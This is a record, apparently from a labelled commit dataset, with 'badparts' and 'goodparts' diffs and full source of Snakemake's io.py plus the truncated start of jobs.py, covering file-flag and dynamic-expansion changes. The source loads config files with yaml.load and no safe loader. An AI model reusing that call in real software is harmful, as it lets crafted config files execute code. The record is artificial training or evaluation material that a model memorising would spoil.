a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n", "add": 1, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["    annotated = flag(value, \"dynamic\")"], "goodparts": ["    annotated = flag(value, \"dynamic\", True)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, \"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return \"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath != \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"}, "/snakemake/jobs.py": {"changes": [{"diff": "\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n", "add": 1, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"], "goodparts": ["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]}, {"diff": "\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n", "add": 34, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["                    yield IOFile(f, self.rule)"], "goodparts": ["                    fileToYield = IOFile(f, self.rule)", "                    fileToYield.clone_flags(f_)", "                    yield fileToYield", "            else:", "                yield f", "    @property", "    def expanded_input(self):", "        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"", "        for f, f_ in zip(self.input, self.rule.input):", "            if not type(f_).__name__ == \"function\":", "                if type(f_.file).__name__ not in [\"str\", \"function\"]:", "                    if contains_wildcard(f_):", "                        expansion = self.expand_dynamic(", "                            f_,", "                            restriction=self.wildcards,", "                            omit_value=_IOFile.dynamic_fill)", "                        if not expansion:", "                            yield f_", "                        for f, _ in expansion:", "                            fileToYield = IOFile(f, self.rule)", "                            fileToYield.clone_flags(f_)", "                            yield fileToYield", "                    else:", "                        yield f", "                else:", "                    yield f"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, 